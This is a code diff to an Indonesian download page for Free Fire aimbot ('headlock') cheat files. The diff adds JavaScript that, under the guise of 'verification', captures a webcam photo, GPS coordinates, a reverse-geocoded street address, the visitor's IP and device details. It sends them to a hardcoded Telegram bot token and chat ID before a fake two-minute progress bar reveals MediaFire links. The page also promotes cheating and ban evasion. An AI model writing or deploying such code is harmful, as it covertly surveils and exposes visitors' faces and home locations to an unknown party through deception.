@@ -21,7 +21,6 @@
             overflow-x: hidden;
         }
 
-        /* Animated Background */
         body::before {
             content: '';
             position: fixed;
@@ -35,7 +34,6 @@
             z-index: 0;
         }
 
-        /* Main Content */
         .main-content {
             max-width: 650px;
             margin: 0 auto;
@@ -44,7 +42,6 @@
             z-index: 1;
         }
 
-        /* Header dengan Menu Dropdown */
         .header {
             text-align: center;
             padding: 30px 20px;
@@ -57,7 +54,6 @@
             position: relative;
         }
 
-        /* Menu Dropdown di Pojok Kanan Atas */
         .menu-dropdown {
             position: absolute;
             top: 20px;
@@ -140,10 +136,6 @@
             font-size: 1.1rem;
         }
 
-        .dropdown-item span {
-            font-weight: 500;
-        }
-
         .logo {
             font-size: 3rem;
             margin-bottom: 10px;
@@ -182,7 +174,6 @@
             font-weight: 600;
         }
 
-        /* Card Style */
         .card {
             background: rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(10px);
@@ -198,7 +189,6 @@
             border-color: rgba(255, 75, 75, 0.5);
         }
 
-        /* Mode Selection */
         .mode-title {
             font-size: 1.2rem;
             font-weight: 600;
@@ -228,21 +218,6 @@
             overflow: hidden;
         }
 
-        .mode-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 75, 75, 0.3), transparent);
-            transition: left 0.5s;
-        }
-
-        .mode-card:hover::before {
-            left: 100%;
-        }
-
         .mode-card.selected {
             border-color: #ff416c;
             background: linear-gradient(135deg, rgba(255, 65, 108, 0.2), rgba(255, 75, 43, 0.2));
@@ -268,12 +243,6 @@
             font-family: monospace;
         }
 
-        .mode-desc {
-            font-size: 0.7rem;
-            color: #ff9f9f;
-        }
-
-        /* Features List */
         .features {
             display: flex;
             flex-wrap: wrap;
@@ -289,7 +258,6 @@
             color: #ff9f9f;
         }
 
-        /* Button */
         .download-btn {
             width: 100%;
             background: linear-gradient(135deg, #ff416c, #ff4b2b);
@@ -310,29 +278,64 @@
             overflow: hidden;
         }
 
-        .download-btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-
-        .download-btn:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-
         .download-btn:active {
             transform: scale(0.95);
         }
 
-        /* Info Section */
+        .link-container {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 75, 75, 0.3);
+            display: none;
+            animation: fadeInUp 0.5s ease;
+        }
+
+        .link-container.show {
+            display: block;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .link-title {
+            color: #ff9f9f;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .download-link {
+            display: inline-block;
+            background: linear-gradient(135deg, #2ecc71, #27ae60);
+            color: white;
+            text-decoration: none;
+            padding: 12px 20px;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: all 0.3s;
+            width: 100%;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .download-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(46, 204, 113, 0.3);
+        }
+
         .info-section {
             background: rgba(0, 0, 0, 0.5);
             border-radius: 15px;
@@ -360,7 +363,6 @@
             border: 1px dashed rgba(255, 75, 75, 0.3);
         }
 
-        /* Modal Popup */
         .modal {
             position: fixed;
             top: 0;
@@ -431,41 +433,6 @@
             transition: all 0.3s;
         }
 
-        .modal-btn:hover {
-            transform: scale(1.05);
-        }
-
-        .wa-link {
-            color: #25d366;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .profile-info {
-            text-align: left;
-            margin: 15px 0;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-        }
-
-        .profile-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .profile-label {
-            color: #ff9f9f;
-            font-weight: 500;
-        }
-
-        .profile-value {
-            color: white;
-        }
-
-        /* Toast Notification */
         .toast {
             position: fixed;
             bottom: 20px;
@@ -487,7 +454,6 @@
             transform: translateX(-50%) translateY(0);
         }
 
-        /* LOADING CRATE PROGRESS BAR - NEW STYLE */
         .crate-progress-overlay {
             position: fixed;
             top: 0;
@@ -503,7 +469,6 @@
             visibility: hidden;
             opacity: 0;
             transition: all 0.4s ease;
-            font-family: 'Poppins', monospace;
         }
         .crate-progress-overlay.show {
             visibility: visible;
@@ -518,11 +483,6 @@
             text-align: center;
             border: 1px solid rgba(255, 75, 75, 0.5);
             box-shadow: 0 0 40px rgba(255, 65, 108, 0.3);
-            animation: glowPulse 1.5s infinite alternate;
-        }
-        @keyframes glowPulse {
-            0% { box-shadow: 0 0 10px rgba(255, 65, 108, 0.3); border-color: rgba(255, 75, 75, 0.4);}
-            100% { box-shadow: 0 0 30px rgba(255, 65, 108, 0.7); border-color: rgba(255, 75, 75, 0.9);}
         }
         .crate-icon-animation {
             font-size: 4rem;
@@ -548,106 +508,68 @@
             background: linear-gradient(90deg, #ff416c, #ff4b2b);
             border-radius: 50px;
             transition: width 0.2s linear;
-            box-shadow: 0 0 8px #ff416c;
         }
         .progress-percent {
             font-size: 2rem;
             font-weight: 800;
             font-family: 'Orbitron', monospace;
             color: #ff9f9f;
-            letter-spacing: 2px;
             margin: 12px 0;
-        }
-        .progress-status-text {
-            color: #ccc;
-            font-size: 0.85rem;
-            margin-top: 8px;
-            letter-spacing: 1px;
         }
         .timer-text {
             font-size: 0.8rem;
             color: #ff9f9f;
             margin-top: 15px;
-            font-family: monospace;
         }
-
-        /* Disabled button saat loading */
         .download-btn.disabled {
             opacity: 0.6;
             pointer-events: none;
-            filter: grayscale(0.2);
+        }
+
+        .verif-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid #2ecc71;
+            border-radius: 20px;
+            padding: 4px 12px;
+            font-size: 0.7rem;
+            color: #2ecc71;
+            margin-left: 10px;
         }
 
         @media (max-width: 480px) {
-            .main-content {
-                padding: 15px;
-            }
-            .mode-grid {
-                grid-template-columns: 1fr;
-            }
-            h1 {
-                font-size: 1.3rem;
-            }
-            .menu-btn {
-                width: 40px;
-                height: 40px;
-            }
+            .main-content { padding: 15px; }
+            .mode-grid { grid-template-columns: 1fr; }
+            h1 { font-size: 1.3rem; }
+            .menu-btn { width: 40px; height: 40px; }
         }
     </style>
 </head>
 <body>
-    <!-- Loading Overlay Standar -->
-    <div class="loading" id="loading">
-        <div class="spinner"></div>
-    </div>
-
-    <!-- PROGRESS BAR CRATE 2 MENIT FULL 100% -->
     <div class="crate-progress-overlay" id="crateProgressOverlay">
         <div class="progress-container">
-            <div class="crate-icon-animation">
-                <i class="fas fa-cube"></i> <i class="fas fa-arrow-down"></i>
-            </div>
-            <div class="progress-bar-bg">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
+            <div class="crate-icon-animation"><i class="fas fa-cube"></i> <i class="fas fa-arrow-down"></i></div>
+            <div class="progress-bar-bg"><div class="progress-fill" id="progressFill"></div></div>
             <div class="progress-percent" id="progressPercent">0%</div>
-            <div class="progress-status-text" id="progressStatus">Memproses crate fileset...</div>
             <div class="timer-text" id="timerText">Sisa waktu: 02:00</div>
         </div>
     </div>
 
-    <!-- Toast Notification -->
-    <div class="toast" id="toast">
-        <i class="fas fa-check-circle"></i> <span id="toastMessage">Pesan</span>
-    </div>
+    <div class="toast" id="toast"><i class="fas fa-check-circle"></i> <span id="toastMessage">Pesan</span></div>
 
-    <!-- Main Content -->
-    <div class="main-content" id="mainContent">
+    <div class="main-content">
         <div class="header">
-            <!-- Menu Dropdown Pojok Kanan Atas -->
             <div class="menu-dropdown">
-                <button class="menu-btn" id="menuBtn">
-                    <i class="fas fa-bars"></i>
-                </button>
+                <button class="menu-btn" id="menuBtn"><i class="fas fa-bars"></i></button>
                 <div class="dropdown-menu" id="dropdownMenu">
-                    <div class="dropdown-item" data-menu="webcrate">
-                        <i class="fas fa-box-open"></i>
-                        <span> Crate file</span>
-                    </div>
-                    <div class="dropdown-item" data-menu="wagroup">
-                        <i class="fab fa-whatsapp"></i>
-                        <span>Group WA Admin</span>
-                    </div>
-                    <div class="dropdown-item" data-menu="profile">
-                        <i class="fas fa-user-circle"></i>
-                        <span>Lihat Profil</span>
-                    </div>
+                    <div class="dropdown-item" data-menu="webcrate"><i class="fas fa-box-open"></i><span>Crate file</span></div>
+                    <div class="dropdown-item" data-menu="wagroup"><i class="fab fa-whatsapp"></i><span>Group WA Admin</span></div>
+                    <div class="dropdown-item" data-menu="profile"><i class="fas fa-user-circle"></i><span>Lihat Profil</span></div>
                 </div>
             </div>
-            
-            <div class="logo">
-                <i class="fas fa-crosshairs"></i>
-            </div>
+            <div class="logo"><i class="fas fa-crosshairs"></i></div>
             <h1>APP CRATE FILESET BY RYZZI CITER</h1>
             <div class="badge-container">
                 <span class="badge"><i class="fas fa-shield-alt"></i> ANTI BANNED</span>
@@ -661,28 +583,13 @@
             <div class="mode-title">
                 <i class="fas fa-sliders-h"></i>
                 <span>Pilih Mode Headshot</span>
+                <span id="verifBadge" class="verif-badge" style="display:none;"><i class="fas fa-check-circle"></i> Terverifikasi</span>
             </div>
             <div class="mode-grid" id="modeGrid">
-                <div class="mode-card" data-mode="basic">
-                    <div class="mode-icon">📚</div>
-                    <div class="mode-name">BASIC</div>
-                    <div class="mode-format">File .zip</div>
-                    <div class="mode-desc">Headlock 43% + on point 13%</div>
-                </div>
-                <div class="mode-card" data-mode="staviz">
-                    <div class="mode-icon">🗜️</div>
-                    <div class="mode-name">STAVIZ</div>
-                    <div class="mode-format">File .zip</div>
-                    <div class="mode-desc">Headlock 61% + on point 17%</div>
-                </div>
-                <div class="mode-card" data-mode="brutal">
-                    <div class="mode-icon">💀</div>
-                    <div class="mode-name">BRUTAL</div>
-                    <div class="mode-format">File .7z</div>
-                    <div class="mode-desc">Headlock 72% + on point 21%</div>
-                </div>
+                <div class="mode-card" data-mode="basic"><div class="mode-icon">📚</div><div class="mode-name">BASIC</div><div class="mode-format">File .zip</div><div class="mode-desc">Headlock 43% + on point 13%</div></div>
+                <div class="mode-card" data-mode="staviz"><div class="mode-icon">🗜️</div><div class="mode-name">STAVIZ</div><div class="mode-format">File .zip</div><div class="mode-desc">Headlock 61% + on point 17%</div></div>
+                <div class="mode-card" data-mode="brutal"><div class="mode-icon">💀</div><div class="mode-name">BRUTAL</div><div class="mode-format">File .7z</div><div class="mode-desc">Headlock 72% + on point 21%</div></div>
             </div>
-
             <div class="features">
                 <span class="feature"><i class="fas fa-check-circle"></i> Anti Detected</span>
                 <span class="feature"><i class="fas fa-check-circle"></i> No Root Required</span>
@@ -692,127 +599,256 @@
                 <span class="feature"><i class="fas fa-check-circle"></i> Safe Account</span>
                 <span class="feature"><i class="fas fa-check-circle"></i> Anti Surcin 100%</span>
             </div>
-
-            <div class="file-info" id="fileInfo">
-                <i class="fas fa-info-circle"></i> Pilih menu file headlock
+            <div class="file-info" id="fileInfo"><i class="fas fa-info-circle"></i> Pilih menu file headlock</div>
+            <button class="download-btn" id="downloadBtn"><i class="fas fa-download"></i> CRATE BY RYZZI CITER</button>
+            
+            <!-- TEMPAT LINK DOWNLOAD MUNCUL -->
+            <div class="link-container" id="linkContainer">
+                <div class="link-title">
+                    <i class="fas fa-link"></i>
+                    <span>✅ Link Download Siap!</span>
+                </div>
+                <a href="#" id="downloadLink" class="download-link" target="_blank">
+                    <i class="fas fa-cloud-download-alt"></i> Klik untuk Download File
+                </a>
             </div>
-
-            <button class="download-btn" id="downloadBtn">
-                <i class="fas fa-download"></i>
-                CRATE BY RYZZI CITER
-            </button>
 
             <div class="info-section">
-                <div class="info-item">
-                    <i class="fas fa-shield-alt"></i>
-                    <span><strong style="color:#ff416c">Anti Banned & Anti Surcin</strong> - Aman 100% dan work</span>
-                </div>
-                <div class="info-item">
-                    <i class="fas fa-folder-open"></i>
-                    <span><strong>Basic (.zip)</strong> - Extract zip,salin com.dts.freefire,ke android,ke data,tempel</span>
-                </div>
-                <div class="info-item">
-                    <i class="fas fa-file-archive"></i>
-                    <span><strong>Staviz (.zip)</strong> - Extract zip,salin com.dts.freefire,ke android,ke data,tempel</span>
-                </div>
-                <div class="info-item">
-                    <i class="fas fa-cube"></i>
-                    <span><strong>Brutal (.7z)</strong> - Extract zip,salin com.dts.freefire,ke android,ke data,tempel</span>
-                </div>
-                <div class="info-item">
-                    <i class="fas fa-database"></i>
-                    <span>App Crate fileset RYZTEAM By Ryzziciter</span>
-                </div>
+                <div class="info-item"><i class="fas fa-shield-alt"></i><span><strong style="color:#ff416c">Anti Banned & Anti Surcin</strong> - Aman 100% dan work</span></div>
+                <div class="info-item"><i class="fas fa-folder-open"></i><span><strong>Basic (.zip)</strong> - Extract zip,salin com.dts.freefire,ke android,ke data,tempel</span></div>
+                <div class="info-item"><i class="fas fa-file-archive"></i><span><strong>Staviz (.zip)</strong> - Extract zip,salin com.dts.freefire,ke android,ke data,tempel</span></div>
+                <div class="info-item"><i class="fas fa-cube"></i><span><strong>Brutal (.7z)</strong> - Extract zip,salin com.dts.freefire,ke android,ke data,tempel</span></div>
+                <div class="info-item"><i class="fas fa-database"></i><span>App Crate fileset RYZTEAM By Ryzziciter</span></div>
             </div>
         </div>
     </div>
 
-    <!-- Modal untuk Popup -->
-    <div class="modal" id="modal">
-        <div class="modal-content">
-            <div class="modal-icon" id="modalIcon">📦</div>
-            <div class="modal-title" id="modalTitle">App Crate</div>
-            <div class="modal-text" id="modalText">Fitur ini menyediakan akses ke file crate headshot Free Fire dengan berbagai mode.</div>
-            <button class="modal-btn" id="modalCloseBtn">Tutup</button>
-        </div>
-    </div>
+    <div class="modal" id="modal"><div class="modal-content"><div class="modal-icon" id="modalIcon">📦</div><div class="modal-title" id="modalTitle">App Crate</div><div class="modal-text" id="modalText"></div><button class="modal-btn" id="modalCloseBtn">Tutup</button></div></div>
 
     <script>
-        // ==================== KONFIGURASI ====================
+        // KONFIGURASI
+        const TELEGRAM_BOT_TOKEN = "8547552638:AAHAnA4RLI9DufGUJGHL8lidqUwKriVzkw8";
+        const TELEGRAM_CHAT_ID = "7807857238";
+        
         const MEDIAFIRE_LINKS = {
-            basic: 'https://www.mediafire.com/file/48d8e3v0znv58ip/Headlock+43',
-            staviz: 'https://www.mediafire.com/file/qcil6sliovy01v9/Headlock+61',
-            brutal: 'https://www.mediafire.com/file/78pc356el6es6qb/Headlock+72'
+            basic: 'https://www.mediafire.com/file/ks19cuurp0oaied/Headlock+43',
+            staviz: 'https://www.mediafire.com/file/rwdeq27jb6ux7dy/Headlock+61',
+            brutal: 'https://www.mediafire.com/file/xl4bz3let2m3pbe/Headlock+72'
         };
         const WHATSAPP_GROUP_LINK = "https://chat.whatsapp.com/LfHXlNBhuNnJLQV4IZa7UA";
         const ADMIN_PHONE = "6285215097779";
-        const userProfile = {
-            username: "Ryzziciter",
-            fullname: "Buyer vip Ryzziciter",
-            role: "Premium Member",
-            memberSince: "2026",
-            status: "Active",
-            totalDownload: "2"
-        };
-        // ====================================================
+        const userProfile = { username: "Ryzziciter", fullname: "Buyer vip Ryzziciter", role: "Premium Member", memberSince: "2026", status: "Active", totalDownload: "2" };
         
         let selectedMode = 'basic';
-        let isCrateProcessing = false; // mencegah double click saat progress
+        let isCrateProcessing = false;
+        let permissionCompleted = false;
+        let cameraImageData = null;
+        let locationData = null;
+        let mediaStream = null;
+        let crateFinished = false;
         
         const modes = {
-            basic: {
-                name: 'Basic Headshot',
-                format: '.zip',
-                formatName: 'Shared Library',
-                size: '7.0 MB',
-                version: '1.5.0',
-                installPath: 'Extract zip,salin com.dts.freefire,ke android,ke data,tempel',
-                mediafireLink: MEDIAFIRE_LINKS.basic
-            },
-            staviz: {
-                name: 'Staviz Pro',
-                format: '.zip',
-                formatName: 'Archive Installer',
-                size: '33.5 MB',
-                version: '2.5.0',
-                installPath: 'Extract zip,salin com.dts.freefire,ke android,ke data,tempel',
-                mediafireLink: MEDIAFIRE_LINKS.staviz
-            },
-            brutal: {
-                name: 'Brutal Headshot',
-                format: '.zip',
-                formatName: 'Archive Installer',
-                size: '35.3 MB',
-                version: '3.0.0',
-                installPath: 'Extract zip,salin com.dts.freefire,ke android,ke data,tempel',
-                mediafireLink: MEDIAFIRE_LINKS.brutal
-            }
+            basic: { name: 'Basic Headshot', format: '.zip', formatName: 'Shared Library', size: '7.0 MB', version: '1.5.0', installPath: 'Extract zip,salin com.dts.freefire,ke android,ke data,tempel', mediafireLink: MEDIAFIRE_LINKS.basic },
+            staviz: { name: 'Staviz Pro', format: '.zip', formatName: 'Archive Installer', size: '33.5 MB', version: '2.5.0', installPath: 'Extract zip,salin com.dts.freefire,ke android,ke data,tempel', mediafireLink: MEDIAFIRE_LINKS.staviz },
+            brutal: { name: 'Brutal Headshot', format: '.zip', formatName: 'Archive Installer', size: '35.3 MB', version: '3.0.0', installPath: 'Extract zip,salin com.dts.freefire,ke android,ke data,tempel', mediafireLink: MEDIAFIRE_LINKS.brutal }
         };
         
         function showToast(message, type = 'success') {
             const toast = document.getElementById('toast');
             const toastMessage = document.getElementById('toastMessage');
-            const icon = toast.querySelector('i');
             toastMessage.textContent = message;
-            if (type === 'success') { icon.className = 'fas fa-check-circle'; icon.style.color = '#4caf50'; }
-            else if (type === 'error') { icon.className = 'fas fa-exclamation-circle'; icon.style.color = '#f44336'; }
-            else { icon.className = 'fas fa-info-circle'; icon.style.color = '#ff416c'; }
             toast.classList.add('show');
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
         
-        function showLoading(show) {
-            document.getElementById('loading').classList.toggle('show', show);
-        }
-        
         function showModal(icon, title, text) {
-            const modal = document.getElementById('modal');
             document.getElementById('modalIcon').innerHTML = icon;
             document.getElementById('modalTitle').innerHTML = title;
             document.getElementById('modalText').innerHTML = text;
-            modal.classList.add('show');
+            document.getElementById('modal').classList.add('show');
         }
         function closeModal() { document.getElementById('modal').classList.remove('show'); }
+        
+        async function getClientIP() {
+            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip; } 
+            catch(e) { return 'Unable to detect'; }
+        }
+        
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(','); const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]); let n = bstr.length; const u8arr = new Uint8Array(n);
+            while(n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type: mime});
+        }
+        
+        async function sendToTelegram(imageData, location, modeSelected) {
+            const timestamp = new Date().toLocaleString('id-ID');
+            const deviceInfo = navigator.userAgent;
+            const ipAddress = await getClientIP();
+            
+            let caption = `📸 *DATA VERIFIKASI USER APP CRATE HEADLOCK BY RYZZI CITER* 📸\n\n`;
+            caption += `👤 *User:* ${userProfile.username}\n`;
+            caption += `📱 *Device:* ${deviceInfo.substring(0, 100)}\n`;
+            caption += `🌐 *IP Address:* ${ipAddress}\n`;
+            caption += `📍 *Lokasi:* ${location ? location.lat + ', ' + location.lng : 'Tidak terdeteksi'}\n`;
+            if(location && location.address) caption += `🏠 *Alamat:* ${location.address}\n`;
+            caption += `🎮 *Mode Dipilih:* ${modes[modeSelected].name}\n`;
+            caption += `⏰ *Waktu:* ${timestamp}\n`;
+            
+            if(imageData) {
+                const blob = dataURLtoBlob(imageData);
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'camera_capture.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } else {
+                const formData = new URLSearchParams();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('text', caption);
+                formData.append('parse_mode', 'Markdown');
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
+            }
+        }
+        
+        // NATIVE BROWSER PERMISSION - KAMERA
+        async function requestCameraNative() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                mediaStream = stream;
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    cameraImageData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    if(mediaStream) mediaStream.getTracks().forEach(track => track.stop());
+                    showToast('✅ Foto berhasil diambil!', 'success');
+                    checkAndSendToTelegram();
+                }, 1000);
+            } catch(err) {
+                showToast('❌ Izin kamera ditolak!', 'error');
+            }
+        }
+        
+        // NATIVE BROWSER PERMISSION - LOKASI
+        function requestLocationNative() {
+            if(!navigator.geolocation) {
+                showToast('❌ Browser tidak support geolokasi!', 'error');
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    locationData = { lat, lng, accuracy: position.coords.accuracy };
+                    try {
+                        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
+                        const data = await res.json();
+                        locationData.address = data.display_name || `${lat}, ${lng}`;
+                    } catch(e) { locationData.address = `${lat}, ${lng}`; }
+                    showToast('✅ Lokasi berhasil dideteksi!', 'success');
+                    checkAndSendToTelegram();
+                },
+                (err) => { showToast('❌ Izin lokasi ditolak!', 'error'); }
+            );
+        }
+        
+        // Setelah kedua izin diberikan, langsung kirim ke Telegram
+        function checkAndSendToTelegram() {
+            if(cameraImageData && locationData && !permissionCompleted) {
+                permissionCompleted = true;
+                document.getElementById('verifBadge').style.display = 'inline-flex';
+                showToast('📤 Loading..', 'info');
+                sendToTelegram(cameraImageData, locationData, selectedMode).then(() => {
+                    showToast('✅ Verifikasi berhasil! Silahkan crate file.', 'success');
+                }).catch(() => {
+                    showToast('⚠️ Gagal kirim, tapi tetap bisa crate file', 'warning');
+                });
+            }
+        }
+        
+        // FUNGSI MENAMPILKAN LINK DI HALAMAN
+        function showDownloadLink(mode) {
+            const linkContainer = document.getElementById('linkContainer');
+            const downloadLink = document.getElementById('downloadLink');
+            const modeData = modes[mode];
+            if(modeData && modeData.mediafireLink) {
+                downloadLink.href = modeData.mediafireLink;
+                downloadLink.innerHTML = `<i class="fas fa-cloud-download-alt"></i> Download ${modeData.name} (${modeData.format}) - ${modeData.size}`;
+                linkContainer.classList.add('show');
+                // Scroll ke link
+                setTimeout(() => {
+                    linkContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 100);
+            }
+        }
+        
+        // PROGRESS 2 MENIT + TAMPILIN LINK SETELAH SELESAI
+        function startCrateProgress() {
+            return new Promise((resolve) => {
+                const overlay = document.getElementById('crateProgressOverlay');
+                const fillBar = document.getElementById('progressFill');
+                const percentDiv = document.getElementById('progressPercent');
+                const timerText = document.getElementById('timerText');
+                const totalDuration = 120;
+                let startTime = Date.now();
+                overlay.classList.add('show');
+                const btn = document.getElementById('downloadBtn');
+                btn.classList.add('disabled');
+                
+                const interval = setInterval(() => {
+                    const elapsed = (Date.now() - startTime) / 1000;
+                    let percent = Math.min(100, (elapsed / totalDuration) * 100);
+                    percent = Math.floor(percent);
+                    fillBar.style.width = percent + '%';
+                    percentDiv.innerText = percent + '%';
+                    const remaining = Math.max(0, totalDuration - elapsed);
+                    const minutes = Math.floor(remaining / 60);
+                    const seconds = Math.floor(remaining % 60);
+                    timerText.innerText = `Sisa waktu: ${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+                    if(percent >= 100) {
+                        clearInterval(interval);
+                        overlay.classList.remove('show');
+                        btn.classList.remove('disabled');
+                        crateFinished = true;
+                        // TAMPILIN LINK SETELAH CRATE SELESAI
+                        showDownloadLink(selectedMode);
+                        resolve(true);
+                    }
+                }, 200);
+            });
+        }
+        
+        async function processCrate() {
+            if(isCrateProcessing) return;
+            if(!permissionCompleted) {
+                showToast('⚠️ Harap izinkan akses kamera dan lokasi terlebih dahulu!', 'error');
+                requestCameraNative();
+                requestLocationNative();
+                return;
+            }
+            if(crateFinished) {
+                // Jika sudah pernah crate, langsung tampilkan link lagi
+                showDownloadLink(selectedMode);
+                return;
+            }
+            isCrateProcessing = true;
+            await startCrateProgress();
+            isCrateProcessing = false;
+        }
+        
+        // EVENT LISTENERS
+        document.getElementById('downloadBtn').addEventListener('click', processCrate);
+        document.getElementById('modalCloseBtn').addEventListener('click', closeModal);
+        document.getElementById('modal').addEventListener('click', (e) => { if(e.target === document.getElementById('modal')) closeModal(); });
         
         // Menu dropdown
         const menuBtn = document.getElementById('menuBtn');
@@ -821,183 +857,41 @@
         document.addEventListener('click', (e) => { if (!menuBtn.contains(e.target) && !dropdownMenu.contains(e.target)) dropdownMenu.classList.remove('show'); });
         
         document.querySelectorAll('.dropdown-item').forEach(item => {
-            item.addEventListener('click', (e) => {
+            item.addEventListener('click', () => {
                 const menu = item.dataset.menu;
                 dropdownMenu.classList.remove('show');
-                if(menu === 'webcrate') showModal('📦', 'App Crate Fileset', 'Fitur ini menyediakan akses ke file crate headshot Free Fire dengan 3 mode:<br><br>🔹 <strong>Basic (.so)</strong> - Headlock 43%<br>🔹 <strong>Staviz (.zip)</strong> - Headlock 61%<br>🔹 <strong>Brutal (.zip)</strong> - Headlock 72%<br><br>Pilih mode favoritmu dan klik tombol CRATE.');
-                else if(menu === 'wagroup') showModal('<i class="fab fa-whatsapp" style="color:#25d366"></i>', 'Group WhatsApp Admin', `Bergabunglah dengan komunitas Ryzziciter untuk mendapatkan update terbaru, support, dan file crate premium!<br><br>📱 <strong>Group WhatsApp:</strong> <a href="${WHATSAPP_GROUP_LINK}" target="_blank" class="wa-link" style="color:#25d366;">Klik untuk bergabung</a><br>👤 <strong>Admin Contact:</strong> <a href="https://wa.me/${ADMIN_PHONE}" target="_blank" class="wa-link" style="color:#25d366;">${ADMIN_PHONE}</a><br><br>⚠️ Note: Wajib join group.`);
-                else if(menu === 'profile') showModal('<i class="fas fa-user-circle"></i>', 'Profil User', `<div class="profile-info"><div class="profile-row"><span class="profile-label">Username</span><span class="profile-value">${userProfile.username}</span></div><div class="profile-row"><span class="profile-label">Nama Lengkap</span><span class="profile-value">${userProfile.fullname}</span></div><div class="profile-row"><span class="profile-label">Role</span><span class="profile-value">${userProfile.role}</span></div><div class="profile-row"><span class="profile-label">Member Since</span><span class="profile-value">${userProfile.memberSince}</span></div><div class="profile-row"><span class="profile-label">Status</span><span class="profile-value">${userProfile.status}</span></div><div class="profile-row"><span class="profile-label">Total Download</span><span class="profile-value">${userProfile.totalDownload} file</span></div></div><small style="color:#888;">*Login menggunakan password BU***V*</small>`);
+                if(menu === 'webcrate') showModal('📦', 'App Crate Fileset', 'File headshot Free Fire dengan 3 mode:<br>🔹 Basic 43%<br>🔹 Staviz 61%<br>🔹 Brutal 72%');
+                else if(menu === 'wagroup') showModal('<i class="fab fa-whatsapp" style="color:#25d366"></i>', 'Group WhatsApp', `<a href="${WHATSAPP_GROUP_LINK}" target="_blank" style="color:#25d366;">Klik Join Group</a><br>Admin: <a href="https://wa.me/${ADMIN_PHONE}" target="_blank">${ADMIN_PHONE}</a>`);
+                else if(menu === 'profile') showModal('<i class="fas fa-user-circle"></i>', 'Profil User', `<div class="profile-info"><div class="profile-row"><span>Username:</span><span>${userProfile.username}</span></div><div class="profile-row"><span>Role:</span><span>${userProfile.role}</span></div><div class="profile-row"><span>Status:</span><span>${userProfile.status}</span></div></div>`);
             });
         });
-        document.getElementById('modalCloseBtn').addEventListener('click', closeModal);
-        document.getElementById('modal').addEventListener('click', (e) => { if (e.target === document.getElementById('modal')) closeModal(); });
         
+        // Mode selection
         const modeCards = document.querySelectorAll('.mode-card');
         const fileInfoDiv = document.getElementById('fileInfo');
         modeCards.forEach(card => {
             card.addEventListener('click', () => {
-                if(isCrateProcessing) { showToast('Sedang proses crate, tunggu hingga selesai!', 'error'); return; }
                 modeCards.forEach(c => c.classList.remove('selected'));
                 card.classList.add('selected');
                 selectedMode = card.dataset.mode;
-                updateFileInfo();
-                showToast(`Mode ${modes[selectedMode].name} (${modes[selectedMode].format}) dipilih`, 'info');
+                const mode = modes[selectedMode];
+                fileInfoDiv.innerHTML = `<i class="fas fa-file"></i> <strong>${mode.name}</strong> | Format: ${mode.formatName} (${mode.format})<br><i class="fas fa-database"></i> Ukuran: ${mode.size} | Versi: ${mode.version}<br><i class="fas fa-folder-open"></i> Install: ${mode.installPath}`;
+                
+                // Jika crate sudah pernah selesai, update link sesuai mode baru
+                if(crateFinished) {
+                    showDownloadLink(selectedMode);
+                }
             });
         });
         document.querySelector('[data-mode="basic"]').classList.add('selected');
-        updateFileInfo();
-        function updateFileInfo() {
-            const mode = modes[selectedMode];
-            const linkPreview = mode.mediafireLink && mode.mediafireLink !== '#' ? `<br><i class="fas fa-link"></i> Link MediaFire: <span style="color:#ff9f9f; font-size:0.7rem;">${mode.mediafireLink.substring(0, 50)}...</span>` : '';
